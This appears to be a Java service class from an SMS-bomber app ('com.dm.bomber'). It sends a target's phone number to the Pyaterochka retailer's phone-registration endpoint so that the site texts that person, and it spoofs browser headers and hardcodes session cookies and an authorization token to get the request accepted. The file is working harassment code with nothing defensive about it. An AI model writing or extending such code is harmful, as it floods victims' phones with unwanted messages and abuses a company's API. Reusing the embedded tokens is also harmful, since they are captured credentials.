package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Request;

public class Pyaterochka extends JsonService {

    public Pyaterochka() {
        setUrl("https://5ka.ru/api/v1/services/phones/add");
        setMethod(POST);
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("Accept-Encoding", "gzip, deflate, br");
        builder.addHeader("Accept-Language", "ru,en-US;q=0.7,en;q=0.3");
        builder.addHeader("Connection", "keep-alive");
        builder.addHeader("Content-Length", "25");
        builder.addHeader("Content-Type", "application/json;charset=utf-8");
        builder.addHeader("Cookie", "TS18d164c6027=08549da071ab200040b4709c8ceca7daf6eec8ae682cb1bd717d2785b764f0b10b20a9279d2167cd087461490211300073afb040c233b283620e57cb4d451eb426f4d5494ab4b2a5770dcf9cb68d41c222929da9d2dee560878ef7c933facc35; TS00000000076=08549da071ab280092918f962bcd7b6db388b58e865683a6252e0f3ae1c6ccaaba53c26c685bd8f56bfcbe2e7e87b6c808e0b204d209d0004fb0bd8383a38a959a1f2153fed0859edf98c99d614fc4957482d4e2de029f8138961aaba5b05ab80ca75cc7099d29ee688dd21335b86da82300162a10c2e5d91275bc39a14db21d8d6901fd82ce5f3e2dd7e8359153a14fd18677333f8c6b4513e8a1b3e41ff6defad43bb461a52d8e4c63a3acafaaad599627de0289010dcb370516e7b8df9c1d330bd67ddc5199abd33f06ed07d4a9f52a2c21b306fe85396382fb77f07c717ac29bac27c56fa24c7a848e65682b7a1151aa5b4831290b31eb92b720745c80290fea7b16f43d2c20; TSPD_101_DID=08549da071ab280092918f962bcd7b6db388b58e865683a6252e0f3ae1c6ccaaba53c26c685bd8f56bfcbe2e7e87b6c808e0b204d2063800521cc28aa33c8999713ab7259b0ad91cfd3e8474b0844c6be91ad2f506a07313431107740351bc8c044c6488e1069cf2283cfe330256df38; TS01658276=01a93f7547c771b649c1b05ac7ed2a21cd40b9be27fd56c939d52064496fd67dc68ade8cf4c34c6319261bc323670d498fe2ef9857; header_name=X-Authorization; TS010a09ac=01a93f754725da982ae3a9ac3c76346988a4a14d36e19b30f8aacfbded3e387296924fc81da7296de459e3bb9de61e5bfc99dbf529; token=Tokende33e4e26ae21bb19b01c8eb9499c279c8b22ac6; _gcl_au=1.1.204861771.1627741583; _ym_uid=1627741583430780482; _ym_d=1627741583; _ga=GA1.2.240929926.1627741584; _gid=GA1.2.804242884.1627741584; _ym_isad=1; _dc_gtm_UA-77780429-1=1; _gat_gtag_UA_134410702_1=1; _ym_visorc=w");
        builder.addHeader("Host", "5ka.ru");
        builder.addHeader("Origin", "https://5ka.ru");
        builder.addHeader("Referer", "https://5ka.ru/my/forgot_password");
        builder.addHeader("Sec-Fetch-Dest", "empty");
        builder.addHeader("Sec-Fetch-Mode", "cors");
        builder.addHeader("Sec-Fetch-Site", "same-origin");
        builder.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0");
        builder.addHeader("X-Authorization", "Tokende33e4e26ae21bb19b01c8eb9499c279c8b22ac6");

        return super.buildRequest(builder);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("number", "+" + getFormattedPhone());
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
